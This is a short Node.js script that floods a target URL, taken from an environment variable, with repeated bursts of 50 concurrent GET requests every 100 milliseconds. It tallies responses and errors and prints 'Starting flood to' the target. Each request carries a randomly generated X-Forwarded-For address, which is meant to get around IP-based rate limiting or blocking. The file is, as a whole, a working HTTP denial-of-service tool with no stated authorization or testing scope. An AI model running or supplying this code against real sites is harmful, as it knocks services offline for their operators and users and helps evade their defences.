const https = require('https');
const http = require('http');
const { URL } = require('url');
require('dotenv').config();

const target = process.env.TARGET;
const threads = 50;
const delayMs = 100;

const { protocol, hostname, pathname } = new URL(target);
const client = protocol === 'https:' ? https : http;

let totalRequests = 0;
let totalErrors = 0;

const agent = new (protocol === 'https:' ? https.Agent : http.Agent)({
	keepAlive: true,
	maxSockets: threads
});

function getRandomIP() {
	return `${Math.random() * 256 | 0}.${Math.random() * 256 | 0}.${Math.random() * 256 | 0}.${Math.random() * 256 | 0}`;
}

function sendRequest(id) {
	const req = client.request({
		hostname,
		path: pathname,
		method: 'GET',
		headers: {
			'User-Agent': `SimClient-${id}`,
			'X-Forwarded-For': getRandomIP(),
		},
		agent,
		timeout: 3000,
	}, res => {
		res.resume();
		totalRequests++;
	});

	req.on('error', () => totalErrors++);
	req.end();
}

function flood() {
	for (let i = 0; i < threads; i++) {
		sendRequest(i);
	}
	process.stdout.write(`\rRequests: ${totalRequests} Errors: ${totalErrors}`);
	setTimeout(flood, delayMs);
}

console.log(`Starting flood to ${target}`);
flood();